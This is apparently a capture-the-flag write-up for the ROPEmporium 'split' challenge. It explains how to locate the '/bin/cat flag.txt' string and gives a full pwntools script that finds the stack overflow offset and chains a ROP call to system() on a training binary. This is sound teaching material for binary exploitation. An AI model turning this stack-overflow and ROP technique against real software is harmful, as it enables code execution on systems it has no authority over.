# ROPEmporium (Split)
Split is the second challenge of the ROPemporium series on binary exploitation, it's a pretty simple challenge that just require you to make a system call using the address of the string "/bin/cat flag.txt", to find this string you can just look at the different functions the binary has and you should see one called `usefulString`, this symbol should contain the string we want.

For this challenge we will heavily rely on pwntools, python and gdb, although the challenge is pretty simple (took me 5 mins to solve) i think it's pretty educative on how to rop properly.

## Solving the Challenge
Looking at the [ROPEmporium Website](https://ropemporium.com/challenge/split.html) we are given the following instructions.
```
Still here

I'll let you in on a secret: that useful string "/bin/cat flag.txt" is still present in this binary, as is a call to system(). It's just a case of finding them and chaining them together to make the magic happen. 
```

We know there is the string "/bin/cat flag.txt" in the binary, and we can easily make a system call since the function is present in the binary.
```py
import pwn

pwn.context.arch = "amd64"
e = pwn.ELF("./split")

def find_eip(payload):
    io = pwn.process(e.path)
    io.sendlineafter(b"> ", payload)
    io.wait()
    rip_offset = pwn.cyclic_find(io.corefile.read(io.corefile.rsp, 4))
    pwn.log.info("Located RIP offset at {a}".format(a=rip_offset))
    return rip_offset

pop_rdi_ret = pwn.p64(0x4007c3)
offset = find_eip(pwn.cyclic(100))
io = pwn.process(e.path)
rop = pwn.ROP(e)
rop.system(e.symbols.usefulString)

payload = [
    b"A"*offset,
    rop.chain(),
    pop_rdi_ret
]

io.sendlineafter(b"> ", b"".join(payload))
io.interactive()
```

Running the following script should automatically find the crash offset and it will call system("/bin/cat flag.txt").
